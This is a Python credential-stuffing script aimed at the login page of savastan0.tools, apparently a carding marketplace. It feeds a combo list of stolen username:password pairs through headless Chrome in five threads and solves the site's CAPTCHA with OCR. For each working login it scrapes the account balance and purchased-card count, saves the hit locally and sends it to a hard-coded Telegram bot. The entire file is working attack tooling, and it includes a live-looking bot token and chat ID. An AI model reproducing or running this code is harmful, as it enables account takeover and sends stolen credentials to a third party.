import time
import io
import pytesseract
import threading
import gzip
import zlib
import brotli
import re
from PIL import Image
from telegram import Bot
from concurrent.futures import ThreadPoolExecutor
from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from rich.console import Console

# === Config ===
BOT_TOKEN = "7107201030:AAF7LMtxvtpQ-IV3OqFxZ3ouUVsWx9Q-rnQ"
CHAT_ID = "7249106493"
console = Console()
lock = threading.Lock()

# === Load Combo File ===
combo_file = input("📄 Enter combo file (user:pass per line): ").strip()
with open(combo_file, "r") as f:
    combos = [line.strip().split(":") for line in f if ":" in line]

# === Setup Selenium Driver ===
def get_driver():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    driver = webdriver.Chrome(options=options)
    driver.scopes = [".*savastan0\\.tools.*"]
    return driver

# === Decode response body based on encoding ===
def decode_response(resp):
    raw = resp.body
    encoding = resp.headers.get('Content-Encoding', '').lower()
    try:
        if 'br' in encoding:
            return brotli.decompress(raw).decode('utf-8', errors='ignore')
        elif 'gzip' in encoding:
            return gzip.decompress(raw).decode('utf-8', errors='ignore')
        elif 'deflate' in encoding:
            return zlib.decompress(raw).decode('utf-8', errors='ignore')
        else:
            return raw.decode('utf-8', errors='ignore')
    except:
        return raw.decode('utf-8', errors='ignore')

# === Main combo checker ===
def check_combo(username, password):
    driver = get_driver()
    try:
        # === Solve CAPTCHA with retry ===
        solved = False
        attempt = 0
        while not solved and attempt < 5:
            driver.get("https://savastan0.tools/login")
            time.sleep(2)
            try:
                screenshot = driver.get_screenshot_as_png()
                captcha_img = driver.find_element(By.XPATH, "//img[contains(@src, 'captcha') or contains(@alt, 'captcha')]")
                loc = captcha_img.location
                size = captcha_img.size

                full_img = Image.open(io.BytesIO(screenshot))
                left = loc['x']
                top = loc['y']
                right = left + size['width']
                bottom = top + size['height']
                captcha_crop = full_img.crop((left, top, right, bottom))
                captcha_crop = captcha_crop.resize((captcha_crop.width * 2, captcha_crop.height * 2))  # Upscale
                captcha = pytesseract.image_to_string(captcha_crop, config='--psm 7').strip()

                if captcha and len(captcha) >= 4:
                    solved = True
                    break
            except:
                pass
            attempt += 1
            time.sleep(1)

        if not solved:
            console.print(f"[yellow][✘] CAPTCHA WARNING PLEASE WAIT... {username}[/yellow]")
            driver.quit()
            return

        # === Fill and submit form ===
        inputs = driver.find_elements(By.TAG_NAME, "input")
        inputs[0].send_keys(username)
        inputs[1].send_keys(password)
        inputs[2].send_keys(captcha)
        try:
            submit = driver.find_element(By.XPATH, "//button[contains(text(), 'Login') or contains(@class, 'login') or @type='submit'] | //input[@type='submit']")
            driver.execute_script("arguments[0].click();", submit)
        except:
            inputs[-1].send_keys("\n")
        time.sleep(5)

        # === Capture response ===
        response = ""
        for req in driver.requests:
            if req.method == 'POST' and "/login" in req.url and req.response:
                response = decode_response(req.response)
                break

        if not response:
            console.print(f"[red] [✘] NO RESPONSE FOUND ❌ {username}[/red]")
            driver.quit()
            return

        # === Response logic ===
        if "warning CAPTCHA" in response:
            console.print(f"[red][✘] TRY AGAIN CAPTHA WARNING {username}[/red]")
        elif "incorrect" in response.lower():
            console.print(f"[red][✘] INVALID ❌ USERNAME OR PAASWORD\n[✘] USERNAME {username}\n[✘] PASSWORD {password}[/red]")
            console.print(f"[dim]{response[:120]}[/dim]")
        elif "location.href = 'index'" in response or "balance" in response.lower():
            # Fetch balance
            driver.get("https://savastan0.tools/index")
            time.sleep(2)
            html = driver.page_source
            match = re.search(r"Balance:\s*<strong>(.*?)<", html)
            balance = match.group(1).strip() if match else "N/A"

            # Fetch card count
            driver.get("https://savastan0.tools/?purchased")
            time.sleep(2)
            cards = len(re.findall(r"NR:\s*</strong><span\s+onClick=", driver.page_source))

            # Output success
            console.print(f"[green][✘] USERNAME -: {username}\n[✘] PASSWORD -: {password}\n[✘] RESPONSE -: LOGIN SUCCESS[/green]")
            console.print(f"[green][✘] BALANCE -: {balance}[/green]")

            # Save + Telegram
            hit_data = f"[✘] USERNAME -: {username}\n[✘] PASSWORD -: {password}\n[✘] BALANCE -: {balance}"
            with lock:
                with open("hit.txt", "a") as f:
                    f.write(hit_data)
                Bot(token=BOT_TOKEN).send_message(chat_id=CHAT_ID, text=f"[✘] USERNAME -: {username}\n[✘] PASSWORD -: {password}\n[✘] BALANCE -: {balance}")
        else:
            console.print(f"[yellow][✘] Unknown response for {username}[/yellow]")
            console.print(f"[dim]{response[:200]}[/dim]")

        driver.quit()

    except Exception as e:
        console.print(f"[red]❌ Error with {username}: {e}[/red]")
        try:
            driver.quit()
        except:
            pass

# === Run Multi-threaded ===
console.print("[bold cyan][✘] ACCOUNT CRACKING STARTED\n[✘] PLEASE WAIT... TARGETS LOCKED IN!\n════════════════════════════════════[/bold cyan]")
with ThreadPoolExecutor(max_workers=5) as executor:
    for user, pwd in combos:
        executor.submit(check_combo, user, pwd)